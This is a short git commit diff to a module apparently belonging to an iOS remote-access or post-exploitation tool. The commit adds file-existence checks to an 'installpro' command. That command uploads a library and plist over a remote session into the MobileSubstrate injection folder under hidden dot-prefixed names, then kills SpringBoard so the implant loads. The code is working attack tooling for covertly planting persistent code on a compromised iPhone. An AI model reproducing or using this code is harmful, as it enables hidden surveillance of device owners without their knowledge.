20b3bb289f32334074d21fa60b5d71ac64cec654
Luca <orksec@protonmail.com>
2021-03-26 09:18:28 +0100

    Added local file existence checks to installpro

--- modules/commands/iOS/installpro_ios.py
+++ modules/commands/iOS/installpro_ios.py
@@ -3,7 +3,6 @@ import re
 import os
 import time
 
-
 class command:
     def __init__(self):
         self.name = "installpro"
@@ -11,11 +10,15 @@ class command:
 
     def run(self, session, cmd_data):
         h.info_general("Uploading dylib 1/2...")
-        session.upload_file("resources/espro.dylib",
-                            "/Library/MobileSubstrate/DynamicLibraries", ".espl.dylib")
-        h.info_general("Uploading plist 2/2...")
-        session.upload_file("resources/espro.plist",
-                            "/Library/MobileSubstrate/DynamicLibraries", ".espl.plist")
-        h.info_general("Respring...")
-        time.sleep(1)
-        session.send_command({"cmd": "killall", "args": "SpringBoard"})
+        if os.path.isfile("resources/espro.dylib"):
+            session.upload_file("resources/espro.dylib", "/Library/MobileSubstrate/DynamicLibraries", ".espl.dylib")
+            h.info_general("Uploading plist 2/2...")
+            if os.path.isfile("resources/espro.plist"):
+                session.upload_file("resources/espro.plist", "/Library/MobileSubstrate/DynamicLibraries", ".espl.plist")
+                h.info_general("Respring...")
+                time.sleep(1)
+                session.send_command({"cmd": "killall", "args": "SpringBoard"})
+            else:
+                print("Unable to find espro.plist! (resources/espro.plist)")
+        else:
+            print("Unable to find espro.dylib! (resources/espro.dylib)")
